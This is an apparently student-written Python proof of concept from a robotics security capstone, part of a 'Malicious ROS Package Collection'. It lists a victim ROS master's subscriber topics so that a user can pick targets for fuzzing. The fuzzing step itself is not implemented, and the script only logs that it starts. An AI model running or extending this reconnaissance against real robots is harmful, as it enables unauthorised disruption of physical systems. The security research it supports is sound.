#!/usr/bin/env python
###################################################################################
##                _____________
##               /           ,.\
##              /           /  \\
##        o    /           {    }\
##         `.  \ ....       \  / /
##           `. \ \\\\       `' /
##             \ \_____________/
##              \      \ \
##               \      \ \
##                \     _\ \________________________
##                (`\  /  \ \ ___         "-._       )
##                 \ \/   /`-'  /,       /`-._"-._  /
##                  `/    """"""'       /___ _"-._"-._
##                  /___ __  _          `-._      '  /
##                  \  RoboSec              "-._ /  /
##                 __\________________________  "  /
##               /    '//,  '//'               )__/
##              /       '///'    ,//'/,       /
##             (.---------------------------./
##              `:.                        //
##                `=======================''
##                  Security for Robotics
##
##             Oregon State University - CS Capstone
##
##         Zach Rogers - Malicious ROS Package Collection
##
##             ROS Package 3 - Subscriber fuzzing
##                         ros3.py
###################################################################################
import os
import subprocess
import rospy
from std_msgs.msg import String

#ROS Environment Variables -- Will need to change these accordingly
ROS_CORE_PORT = "1337"
VICTIM_ROS_HOSTNAME = "172.16.88.129"
VICTIM_ROS_MASTER_URI = "http://" + VICTIM_ROS_HOSTNAME + ":" + ROS_CORE_PORT

ATTACKER_ROS_MASTER_URI = VICTIM_ROS_MASTER_URI
ATTACKER_ROS_HOSTNAME = "172.16.88.128"

#Should we be loud and proud?
VERBOSE = True

def fuzz():
    """
    Pull all subscribers from the victim

    """

    #Set env variables
    log("[!] We are the attacker, setting ROS env variables...")
    os.system("export ROS_MASTER_URI=" + VICTIM_ROS_MASTER_URI)
    os.system("export ROS_HOSTNAME=" + VICTIM_ROS_HOSTNAME)

    #Pull active subscribers from victim ROS machine
    victim_subs = subprocess.check_output(['rostopic list -s'], shell=True)

    #Format subprocess output (split newlines into elements, and remove '/')
    victim_subs = victim_subs.splitlines()
    for x in range(0, len(victim_subs)):
        victim_subs[x] = victim_subs[x][1:]

    #So, what will we be fuzzing?
    log("[*] Which remote subscribers would you like to target?")
    for x in range(0, len(victim_subs)):
        log("\t" + str(x) + ". " + str(victim_subs[x]))

    #Error handling, because the user is always an idiot
    choice = ""
    while True:
        choice = raw_input("Enter the number, or all: ")

        try:
            if str(choice) == "all":
                break
            elif int(choice) > 0 and int(choice) < len(victim_subs):
                break
        except:
            continue

    #Are we fuzzing multiple subscribers, if so do it on separate threads
    if str(choice) == "all":
        log("[!] Starting " + str(len(victim_subs)) + " fuzzing threads...")
    else:
        log("[!] Starting fuzzing against " + str(victim_subs[int(choice)]))



def log(text):
    """
    Logging function - Will output text if VERBOSE is set to True, otherwise calls will be ignored.

    Parameters:
    --------------
        * text - String of text to be logged

    """

    if VERBOSE:
        print str(text)


def main():
    log("[~] PoC showing Subscriber Fuzzing")
    fuzz()


if __name__ == '__main__':
    main()
